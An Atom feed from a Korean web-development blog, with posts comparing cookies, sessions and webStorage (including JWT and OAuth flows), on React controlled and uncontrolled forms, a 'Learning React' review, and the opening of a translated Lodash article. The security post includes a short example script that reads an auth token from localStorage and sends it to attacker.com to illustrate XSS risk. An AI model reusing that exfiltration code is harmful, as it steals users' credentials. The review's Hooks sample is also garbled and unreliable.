<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://chanmi-lee.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://chanmi-lee.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2025-12-23T03:37:34+00:00</updated><id>https://chanmi-lee.github.io/feed.xml</id><title type="html">Chanmi Lee</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">cookie vs session vs webStorage</title><link href="https://chanmi-lee.github.io/articles/2022-04/cookie-session-webstorage/" rel="alternate" type="text/html" title="cookie vs session vs webStorage"/><published>2022-04-03T00:00:00+00:00</published><updated>2022-04-03T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2022-04/cookie-session-webstorage</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2022-04/cookie-session-webstorage/"><![CDATA[<hr/> <p>cookie, session, webStorage(localStorage &amp; sessionStorage)는 모두 웹 클라이언트와 서버 간 상태 관리 또는 데이터 저장을 위한 기술이지만, 저장 위치, 만료 시점, 전송 여부, 보안 등에서 큰 차이가 있습니다.</p> <h3 id="summary">Summary</h3> <table> <thead> <tr> <th>항목</th> <th>Cookie</th> <th>Session (서버)</th> <th>Web Storage (localStorage, sessionStorage)</th> </tr> </thead> <tbody> <tr> <td>📦 저장 위치</td> <td>클라이언트(브라우저), 요청 시 서버로 전송됨</td> <td>서버 (ex. 메모리, Redis, DB)</td> <td>클라이언트(브라우저), 서버에는 전송되지 않음</td> </tr> <tr> <td>🔁 서버 전송 여부</td> <td>✅ 매 요청마다 자동으로 서버에 전송됨</td> <td>❌ 별도 쿠키나 토큰 없으면 식별 불가</td> <td>❌ 서버에 전송되지 않음</td> </tr> <tr> <td>⏳ 만료 시점</td> <td>expires 또는 max-age로 지정 가능</td> <td>브라우저 종료 or 설정한 타임아웃</td> <td>localStorage: 수동 삭제 전까지 유지, sessionStorage: 탭 종료 시</td> </tr> <tr> <td>📦 저장 용량</td> <td>약 4KB</td> <td>서버 설정에 따름</td> <td>약 5~10MB (브라우저별 상이)</td> </tr> <tr> <td>🔐 보안</td> <td>HTTPOnly/secure 옵션 설정 가능</td> <td>일반적으로 안전하나 인증 토큰 노출 우려 있음</td> <td>XSS 공격에 취약 (스크립트 접근 가능)</td> </tr> <tr> <td>🧩 주요 사용 목적</td> <td>인증, 세션 식별, 사용자 기본 설정 저장</td> <td>사용자 로그인 상태 유지</td> <td>UI 상태, 임시 폼 데이터, 캐시 등 클라이언트 전용 정보</td> </tr> <tr> <td>🧱 설정 방법</td> <td>Set-Cookie (서버) 또는 JS (document.cookie)</td> <td>서버측 미들웨어 + 세션 ID 식별 쿠키</td> <td>JS API 사용 (localStorage.getItem, setItem)</td> </tr> </tbody> </table> <hr/> <h3 id="-1-cookie">🍪 1. Cookie</h3> <ul> <li>서버가 클라이언트에 Set-Cookie 헤더로 내려보냄</li> <li>클라이언트는 이후 모든 요청에 해당 쿠키를 자동으로 함께 전송</li> <li>용도: 인증 세션 식별자 저장, 다크모드 설정 저장 등</li> </ul> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre><span class="nb">Set</span><span class="o">-</span><span class="nx">Cookie</span><span class="p">:</span> <span class="nx">sessionId</span><span class="o">=</span><span class="nx">abc123</span><span class="p">;</span> <span class="nx">HttpOnly</span><span class="p">;</span> <span class="nx">Max</span><span class="o">-</span><span class="nx">Age</span><span class="o">=</span><span class="mi">3600</span><span class="p">;</span> <span class="nx">Secure</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">username=seungjun; path=/;</span><span class="dl">"</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <h3 id="️-2-session">🗂️ 2. Session</h3> <ul> <li>서버에 세션 ID와 사용자 데이터를 저장하고, 클라이언트는 쿠키로 sessionId만 보관</li> <li>Express, Django 등 대부분의 서버 프레임워크에서 지원</li> <li>세션은 메모리, Redis, DB 등 다양한 저장소에 저장 가능</li> </ul> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="c1">// Express 예시</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nf">session</span><span class="p">({</span>
<span class="na">secret</span><span class="p">:</span> <span class="dl">'</span><span class="s1">my-secret</span><span class="dl">'</span><span class="p">,</span>
<span class="na">resave</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
<span class="na">saveUninitialized</span><span class="p">:</span> <span class="kc">true</span>
<span class="p">}));</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <h3 id="-3-web-storage-localstorage--sessionstorage">💾 3. Web Storage (localStorage / sessionStorage)</h3> <ul> <li>브라우저 전용 저장소로, 서버와는 무관</li> <li>클라이언트 측에서 자바스크립트로만 접근 가능</li> <li>용도: 페이지 상태 유지, 임시 데이터 캐싱, 테마 설정 등</li> </ul> <blockquote> <p>❗주의: localStorage에 토큰 저장 시 XSS에 취약 → 민감 정보는 절대 저장 금지</p> </blockquote> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="c1">// localStorage</span>
<span class="nx">localStorage</span><span class="p">.</span><span class="nf">setItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">theme</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">dark</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">theme</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nf">getItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">theme</span><span class="dl">"</span><span class="p">);</span>

<span class="c1">// sessionStorage</span>
<span class="nx">sessionStorage</span><span class="p">.</span><span class="nf">setItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">step</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">2</span><span class="dl">"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <h3 id="-보안-리스크-비교">🔐 보안 리스크 비교</h3> <table> <thead> <tr> <th>항목</th> <th>Cookie</th> <th>Session</th> <th>localStorage / sessionStorage</th> </tr> </thead> <tbody> <tr> <td>📤 자동 전송</td> <td>✅ (매 요청마다)</td> <td>✅ (sessionId만 전송)</td> <td>❌ (명시적 전송만)</td> </tr> <tr> <td>❗ XSS 취약성</td> <td>❌ (document.cookie로 읽힘 unless HttpOnly)</td> <td>❌ (세션ID 탈취 가능성)</td> <td>✅ 심각함 (스크립트로 직접 접근 가능)</td> </tr> <tr> <td>❗ CSRF 취약성</td> <td>✅ 자동 전송으로 인해 위험</td> <td>✅ 동일</td> <td>❌ 안전 (자동 전송 X)</td> </tr> <tr> <td>🔒 보호 방법</td> <td>HttpOnly, Secure, SameSite</td> <td>SameSite + 토큰 재검증</td> <td>민감 정보 절대 저장 금지, CSP 설정</td> </tr> </tbody> </table> <hr/> <h3 id="-xss-예시-위험-localstorage">🔐 XSS 예시 위험 (localStorage)</h3> <blockquote> <p>⚠️ localStorage에 인증 토큰 절대 저장 금지!</p> </blockquote> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="code"><pre><span class="c1">// 악성 스크립트</span>
<span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nf">getItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">authToken</span><span class="dl">'</span><span class="p">);</span>
<span class="nf">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://attacker.com/steal</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="na">body</span><span class="p">:</span> <span class="nx">token</span> <span class="p">});</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <p>인증 방식 중에서도 실무에서 가장 많이 쓰이는 두 가지엔 JWT 기반 인증 구조와 OAuth 2.0 인증 방식이 있습니다.</p> <p>JWT는 자체 인증 시스템을 구현할 때 stateless하게 사용자 인증 정보를 주고받을 수 있어서 확장성과 성능 면에서 유리합니다. 반면 OAuth 2.0은 Google, Naver 같은 외부 서비스의 인증을 위임받는 구조로, 복잡하지만 사용자 진입장벽을 낮출 수 있는 장점이 있습니다. 실무에서는 둘을 혼합해 Access Token은 JWT로 구성하고, OAuth 로그인을 통해 초기 인증을 대체하는 방식도 자주 사용하곤 합니다.</p> <hr/> <h3 id="jwt">JWT</h3> <p>JWT는 3개의 Base64 인코딩된 문자열을 점으로 이어 붙인 형태입니다.</p> <pre><code class="language-typograms">xxxxx.yyyyy.zzzzz
│     │      │
│     │      └─ Signature (비밀키 기반 서명)
│     └──────── Payload (sub, exp 등)
└────────────── Header (alg, typ)

// 예시 payload
{
  "sub": "user123",
  "exp": 1713000000,
  "role": "admin"
}
</code></pre> <p>JWT 기반 인증 구조는 하기와 같은 요청 흐름을 가집니다.</p> <pre><code class="language-typograms">[1] 로그인 요청
    ┌────────────┐
    │  Client    │
    └────┬───────┘
         ↓
POST /login (ID, PW)
         ↓
[2] 서버에서 ID/PW 검증 → JWT 생성
         ↓
[3] 응답: JWT (Access Token)
         ↓
저장 방식
 ├─ 쿠키 (HttpOnly)      ← 보안에 유리
 └─ localStorage        ← 사용 편하지만 XSS 취약

[4] 이후 요청 시
Authorization: Bearer {JWT}
</code></pre> <table> <thead> <tr> <th>항목</th> <th>설명</th> </tr> </thead> <tbody> <tr> <td>✅ 장점</td> <td>상태 비저장 (stateless), 확장성 우수, 빠른 인증</td> </tr> <tr> <td>❗ 위험</td> <td>탈취 시 재사용 가능 → exp, refresh token, HttpOnly 등 보완 필수</td> </tr> <tr> <td>💡 실전 전략</td> <td>Access Token 짧게 (15분), Refresh Token은 HttpOnly 쿠키에 저장 &amp; 재발급 API 운영</td> </tr> </tbody> </table> <hr/> <h3 id="oauth-20">OAuth 2.0</h3> <table> <thead> <tr> <th>항목</th> <th>설명</th> </tr> </thead> <tbody> <tr> <td>Authorization Server</td> <td>사용자 인증 &amp; 토큰 발급 (Google, Kakao 등)</td> </tr> <tr> <td>Resource Server</td> <td>보호된 자원 (사용자 정보 등)</td> </tr> <tr> <td>Client</td> <td>프론트엔드 앱 or 백엔드 서버</td> </tr> <tr> <td>Access Token</td> <td>외부 API 호출에 사용 (일회성, 유효시간 짧음)</td> </tr> <tr> <td>Refresh Token</td> <td>Access Token 재발급용, 노출 주의</td> </tr> </tbody> </table> <p>OAuth 2.0 기반 인증 구조는 하기와 같은 요청 흐름을 가집니다.</p> <pre><code class="language-typograms">[1] Client → Authorization Server (ex. Google)
     사용자 로그인 및 권한 승인
           ↓
[2] Redirect with Authorization Code
           ↓
[3] Client → Authorization Server
     POST /token (Authorization Code)
           ↓
[4] Access Token + (Refresh Token)
           ↓
[5] Access Token → Resource Server 호출
           ↓
[6] 사용자 정보 응답
</code></pre>]]></content><author><name></name></author><category term="cookie"/><category term="session"/><category term="webstorage"/><category term="localstorage"/><category term="sessionStorage"/><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">[React] Controlled vs Uncontrolled Component</title><link href="https://chanmi-lee.github.io/articles/2021-08/react-controlled-uncontrolled-component/" rel="alternate" type="text/html" title="[React] Controlled vs Uncontrolled Component"/><published>2021-08-12T00:00:00+00:00</published><updated>2021-08-12T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2021-08/react-controlled-uncontrolled-component</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2021-08/react-controlled-uncontrolled-component/"><![CDATA[<h2 id="-react-제어-컴포넌트-vs-비제어-컴포넌트">🎯 React 제어 컴포넌트 vs 비제어 컴포넌트</h2> <p>React에서 폼을 다룰 때 가장 먼저 부딪히는 개념 중 하나가 바로 제어(Controlled) 컴포넌트와 비제어(Uncontrolled) 컴포넌트입니다. 이 두 방식은 입력값을 어떻게 관리하느냐에 따라 나뉘며, 각각 장단점과 사용 목적이 다릅니다.</p> <p>이번 포스팅에서는 이 두 가지 개념을 정의, 차이점, 코드 예시를 통해 쉽게 이해해보겠습니다.</p> <hr/> <h3 id="제어-컴포넌트-controlled-component">제어 컴포넌트 (Controlled Component)</h3> <p>정의: 입력 요소의 상태(value)를 React 컴포넌트의 state로 관리하는 방식입니다. 즉, 입력값의 소유권이 React에 있습니다.</p> <h4 id="특징">특징</h4> <ul> <li>모든 값은 useState나 this.state로 관리됨</li> <li>onChange 이벤트 핸들러를 통해 state를 업데이트</li> <li>React가 폼의 상태를 전적으로 제어</li> </ul> <p>예제</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="code"><pre><span class="k">import</span> <span class="nx">React</span><span class="p">,</span> <span class="p">{</span> <span class="nx">useState</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">react</span><span class="dl">'</span><span class="p">;</span>

<span class="kd">function</span> <span class="nf">ControlledForm</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">name</span><span class="p">,</span> <span class="nx">setName</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">handleChange</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nf">setName</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="p">};</span>

<span class="kd">const</span> <span class="nx">handleSubmit</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">e</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
<span class="nf">alert</span><span class="p">(</span><span class="s2">`입력한 이름: </span><span class="p">${</span><span class="nx">name</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="p">};</span>

<span class="k">return </span><span class="p">(</span>

<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">onSubmit</span><span class="o">=</span><span class="p">{</span><span class="nx">handleSubmit</span><span class="p">}</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">name</span><span class="p">}</span> <span class="nx">onChange</span><span class="o">=</span><span class="p">{</span><span class="nx">handleChange</span><span class="p">}</span> <span class="sr">/</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">제출</span><span class="o">&lt;</span><span class="sr">/button</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <h3 id="비제어-컴포넌트-uncontrolled-component">비제어 컴포넌트 (Uncontrolled Component)</h3> <p>정의: 입력 요소의 상태를 DOM이 직접 관리하는 방식입니다. 즉, 입력값의 소유권이 실제 HTML 요소에 있습니다.</p> <p>특징</p> <ul> <li>ref를 사용해 DOM 요소에 직접 접근</li> <li>상태를 직접 추적하지 않아 코드가 간단할 수 있음</li> <li>외부 라이브러리 또는 레거시 코드와 호환성이 좋음</li> </ul> <p>예제</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="code"><pre><span class="k">import</span> <span class="nx">React</span><span class="p">,</span> <span class="p">{</span> <span class="nx">useRef</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">react</span><span class="dl">'</span><span class="p">;</span>

<span class="kd">function</span> <span class="nf">UncontrolledForm</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="nx">nameRef</span> <span class="o">=</span> <span class="nf">useRef</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">handleSubmit</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">e</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
<span class="nf">alert</span><span class="p">(</span><span class="s2">`입력한 이름: </span><span class="p">${</span><span class="nx">nameRef</span><span class="p">.</span><span class="nx">current</span><span class="p">.</span><span class="nx">value</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="p">};</span>

<span class="k">return </span><span class="p">(</span>

<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">onSubmit</span><span class="o">=</span><span class="p">{</span><span class="nx">handleSubmit</span><span class="p">}</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">ref</span><span class="o">=</span><span class="p">{</span><span class="nx">nameRef</span><span class="p">}</span> <span class="sr">/</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">제출</span><span class="o">&lt;</span><span class="sr">/button</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <h3 id="summary">Summary</h3> <table> <thead> <tr> <th>항목</th> <th>제어 컴포넌트</th> <th>비제어 컴포넌트</th> </tr> </thead> <tbody> <tr> <td>상태 관리</td> <td>React <code class="language-plaintext highlighter-rouge">state</code></td> <td>DOM 자체</td> </tr> <tr> <td>접근 방식</td> <td><code class="language-plaintext highlighter-rouge">value</code>와 <code class="language-plaintext highlighter-rouge">onChange</code> 사용</td> <td><code class="language-plaintext highlighter-rouge">ref</code>를 통한 DOM 접근</td> </tr> <tr> <td>폼 동기화</td> <td>가능 (일관된 상태 유지)</td> <td>어려움</td> </tr> <tr> <td>초기 값 설정</td> <td><code class="language-plaintext highlighter-rouge">useState</code>로 직접 설정</td> <td><code class="language-plaintext highlighter-rouge">defaultValue</code> 속성 사용</td> </tr> <tr> <td>적합한 상황</td> <td>복잡한 폼, 유효성 검사</td> <td>간단한 입력, 빠른 프로토타이핑</td> </tr> </tbody> </table> <hr/> <h4 id="-어떤-걸-써야-할까">📝 어떤 걸 써야 할까?</h4> <ul> <li>제어 컴포넌트: 대부분의 경우 추천. 특히 유효성 검사, 조건부 렌더링, 실시간 폼 제어가 필요할 때.</li> <li>비제어 컴포넌트: 간단한 입력, 퍼포먼스에 민감하거나 외부 라이브러리 연동 시 유용.</li> </ul> <h4 id="-마무리">💬 마무리</h4> <p>React에서 폼 데이터를 다루는 방법은 다양하지만, 그 핵심은 제어와 비제어의 차이를 이해하는 데 있습니다. 어떤 방식이 더 좋다고 단정할 수는 없으며, 상황에 맞는 선택이 중요합니다.</p> <p>여러분은 어떤 방식이 더 익숙한가요? 댓글로 여러분의 경험을 공유해주세요! 😊</p>]]></content><author><name></name></author><category term="react"/><category term="component"/><category term="controlledcomponent"/><category term="uncontrolledcomponent"/><summary type="html"><![CDATA[🎯 React 제어 컴포넌트 vs 비제어 컴포넌트]]></summary></entry><entry><title type="html">[리뷰] “Learning React”를 읽고</title><link href="https://chanmi-lee.github.io/articles/2021-07/review-of-learning-react/" rel="alternate" type="text/html" title="[리뷰] “Learning React”를 읽고"/><published>2021-07-25T00:00:00+00:00</published><updated>2021-07-25T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2021-07/review-of-learning-react</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2021-07/review-of-learning-react/"><![CDATA[<blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> "한빛미디어 &lt;나는 리뷰어다&gt; 활동으로, 책을 제공받아 작성된 서평입니다."
</code></pre></div> </div> </blockquote> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/learning-react-480.webp 480w,/assets/img/posts/learning-react-800.webp 800w,/assets/img/posts/learning-react-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/learning-react.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="learning-react-리뷰">Learning React 리뷰</h3> <p>이 책은 ES6 이후의 최신 자바스크립트 문법과 함수형 프로그래밍으로부터 시작하여, 함수 컴포넌트를 만드록 합성하는 방법과 다양한 Hook을 사용하고 정의하는 방법, 비동기 데이터 처리 등 실무에서 리액트를 사용할 때 필요한 개념 지식을 예제와 함께 설명해주고 있다. 뿐만 아니라, 리액트의 토대가 되는 상태 관리, 리액트 라우터, 여러가지 테스트 기법, 서버 사이드 랜더링 등에 대해서도 다루고 있다.</p> <p>리액트 입문자에게는 학습 로드맵을 제사함으로써 배우는 과정에서의 혼란을 최소화하도록 도와준다. 또한, 현재 실무에서 리액트를 사용하는 개발자에게도 좀 더 리액트스러운 개발 방향을 차근차근 안내해주고 있다.</p> <h3 id="책의-구성">책의 구성</h3> <p>책의 초반부에는 최신 자바스크립트 기술과 리액트 탄생의 바탕이 된 패러다임인 함수형 프로그래밍의 개념과 예시로 시작한다. 리액트를 통해 컴포넌트를 생성하고 이를 관리할 때, 가독성, 재사용성, 테스트 가능성이 좋은 패턴을 더 많이 활용할 수 있도록 구체적인 예시 코드를 제공해주어 이해를 돕고 있다. JSX를 통해 자바스크립트 코드 안에서 태그 기반의 구문을 써서 간편하게 리액트 앨리먼트를 생성하는 방법을 예제와 함께 제시해준다.</p> <p>이어서, 상태(State)를 가진 컴포넌트를 만드는 방법과 컴포넌트간의 상태를 전달하는 방법, 그리고 상태가 있는 컨텍스트 프로바이더(Stateful context provider)를 통해 리액트 애플리케이션에서 관심사를 분리하는 방법을 다루고 있다.</p> <ul> <li>상태를 리액트 함수 컴포넌트에 넣을 때는 훅스(Hooks)라고 부르는 리액트 기능을 사용한다. (리액트 v16.8.0 이전에는 클래스 컴포넌트를 사용하여 컴포넌트에 상태를 추가하였다.)</li> <li>리액트에서 제공하는 useState, useEffect, useRef, useContext 외에도 커스텀 훅을 예제와 함께 제시한다. (불필요한 중복을 추상화하여 제거하거나, 렌더링 성능을 개선하는 훅스 등이 있다.)</li> </ul> <blockquote> <p>Hooks 사용 시 규칙</p> </blockquote> <ul> <li>Hooks는 컴포넌트 영역 안에서만 호출해야 한다.</li> <li>기능을 가능한 작은 단위의 여러 훅으로 나누면 좋다.</li> <li>리액트 함수의 최상위 수준에서만 훅을 사용해야 한다. (즉, 조건문이나 루프 등에서 훅을 사용하면 안된다.)</li> </ul> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="code"><pre><span class="c1">// Good: 훅 안에 if문 등의 조건문을 사용해야 하는 경우는 아래와 같은 방식으로 훅을 사용한다</span>
<span class="kd">function</span> <span class="nf">Counter</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">count</span><span class="p">,</span> <span class="nx">setCount</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">checked</span><span class="p">,</span> <span class="nx">toggle</span><span class="p">]</span> <span class="o">=</span>
<span class="nf">useState</span><span class="p">(</span>
<span class="nx">count</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="nx">count</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span>
<span class="p">?</span> <span class="nx">undefind</span>
<span class="p">:</span> <span class="o">!</span><span class="nx">c</span><span class="p">,</span>
<span class="p">(</span><span class="nx">count</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">?</span> <span class="kc">undefined</span>
<span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Bad: count &gt; 5일 때만 훅이 호출되어야 하는 뜻으로 아래와 같이 작성하면, 이로 인해 배열의 값이 사라지게 된다.</span>
<span class="c1">// count &gt; 5 : [count, checked, DependencyArray, 0, DependecyArray]</span>
<span class="c1">// count &lt;= 5 : [count, DependencyArray, 1]</span>
<span class="kd">function</span> <span class="nf">Counter</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">count</span><span class="p">,</span> <span class="nx">setCount</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">if </span><span class="p">(</span><span class="nx">count</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
<span class="nx">count</span> <span class="p">[</span><span class="nx">checked</span><span class="p">,</span> <span class="nx">toggle</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>대부분의 프로그래밍 언어가 코드를 실행하기 전에 컴파일 단계를 거치는데 언어마다 상당히 엄격한 규칙이 있고, 이를 지키지 않는 코드는 컴파일되지 않는다. 반면 자바스크립트는 그런 규칙이 적고 컴파일러를 사용하지 않아 런타임 환경에서 오류를 마주하는 경우가 상대적으로 빈번하다. 이를 보완하기 위해, 작성한 코드를 분석해서 구체적인 규칙을 따르도록 도와주는 도구로 JSHint, JSLint를 소개하고 CRA 프로젝트에서 ESLint, Prettier를 설정하고 규칙을 테스트하는 방법을 보여준다.</p> <p>리액트 앱에서 타입 검사를 수행하기 위해 대표적인 prop-type 라이브러리, flow, TypeScript를 사용하는 세 가지 방법도 이어서 설명한다. 또한, 프로덕션 배포 시 모듈 번들러인 웹팩의 장점과 설정 방법들도 코드와 함께 설명해준다. 웹팩을 사용하면 의존 관계가 있는 여러 파일들을 (ex- JavaScript, LESS, CSS, JSX 등) 받아서 한 파일로 묶어주는데, 브라우저는 이 번들 파일을 한 번만 읽기 때문에 <strong>네트워크 성능이 개선</strong>된다는 장점이 있다.</p> <hr/> <p>🔗 참조</p> <p>📌 <a href="https://www.hanbit.co.kr/store/books/look.php?p_code=B3942115529">한빛출판사: Learning React</a></p>]]></content><author><name></name></author><category term="React"/><summary type="html"><![CDATA["한빛미디어 &lt;나는 리뷰어다&gt; 활동으로, 책을 제공받아 작성된 서평입니다."]]></summary></entry><entry><title type="html">[번역] Lodash를 대체하는 순수 자바스크립트 함수</title><link href="https://chanmi-lee.github.io/articles/2021-03/Pure-JavaScript-Functions-as-a-Replacement-for-Lodash/" rel="alternate" type="text/html" title="[번역] Lodash를 대체하는 순수 자바스크립트 함수"/><published>2021-03-07T00:00:00+00:00</published><updated>2021-03-07T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2021-03/Pure-JavaScript-Functions-as-a-Replacement-for-Lodash</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2021-03/Pure-JavaScript-Functions-as-a-Replacement-for-Lodash/"><![CDATA[<blockquote> <p>이 글은 원저자 <a href="https://medium.com/@rcdexta">RC</a> 의 허락을 받아 <a href="https://blog.bitsrc.io/you-dont-need-lodash-or-how-i-started-loving-javascript-functions-3f45791fa6cd">Pure JavaScript Functions as a Replacement for Lodash</a> 을 번역한 글입니다</p> </blockquote> <figure> <picture> <source class="responsive-img-srcset" srcset="https://miro.medium.com/max/1400/1*zbJmSCECXK13rS7-4CsRzQ-480.webp 480w,https://miro.medium.com/max/1400/1*zbJmSCECXK13rS7-4CsRzQ-800.webp 800w,https://miro.medium.com/max/1400/1*zbJmSCECXK13rS7-4CsRzQ-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="https://miro.medium.com/max/1400/1*zbJmSCECXK13rS7-4CsRzQ.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h2 id="함수형-프로그래밍">함수형 프로그래밍?</h2> <p>JavaScript와 함께 사용되는 유틸리티 함수들의 종류는 매우 다양합니다. 이 중 가장 일반적으로 사용되는 <a href="https://lodash.com">Lodash</a>와 <a href="https://underscorejs.org">Underscore.js</a>의 기능과 순수 자바스크립트 함수를 비교해보고자 합니다. 예제로 주어지는 함수들 중 일부는 ES5을 지원하지만 일부는 ES6의 지원이 필요하기도 합니다.</p> <p>Lodash나 Underscore.js 등의 라이브러리의 핵심 디자인 원칙은 <strong>함수형 